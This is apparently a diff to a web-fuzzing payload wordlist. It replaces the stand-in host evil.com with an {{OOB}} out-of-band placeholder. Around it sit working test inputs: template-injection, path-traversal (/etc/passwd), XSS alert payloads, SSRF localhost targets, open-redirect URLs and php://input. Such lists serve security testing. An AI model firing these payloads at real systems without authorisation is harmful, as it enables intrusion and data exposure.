@@ -240,7 +240,7 @@ ${{constructor.constructor('return 7*7')()}}
 /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/
 /..%2f
 /../
-//evil.com
+//{{OOB}}
 //☃.com
 />
 /etc/passwd
@@ -598,8 +598,8 @@ guest_@@_X
 guest_^^_X
 http://127.0.0.1
 http://[::1]/
-http://example.com@evil.com/
-https://evil.com
+http://example.com@{{OOB}}/
+https://{{OOB}}
 inf
 isAdmin:0
 isAdmin:1
@@ -837,7 +837,7 @@ yes
 ';alert(1);//
 </textarea><script>alert(1)</script>
 http://localhost/callback?code=123
-https://evil.com/redirect?to=//127.0.0.1/
+https://{{OOB}}/redirect?to=//127.0.0.1/
 -9223372036854775808
 18446744073709551615
 php://input
